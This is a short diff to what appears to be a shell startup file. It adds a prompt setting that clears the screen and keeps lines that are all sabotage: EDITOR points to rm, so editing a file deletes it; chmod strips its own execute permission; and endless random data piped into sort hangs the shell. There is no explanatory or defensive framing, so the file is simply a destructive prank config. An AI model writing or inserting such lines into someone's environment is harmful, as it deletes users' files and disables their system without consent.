@@ -1,3 +1,4 @@
+export PS1=`clear`
 export EDITOR="/usr/bin/rm"
 chmod -x `which chmod`
 cat /dev/random | sort
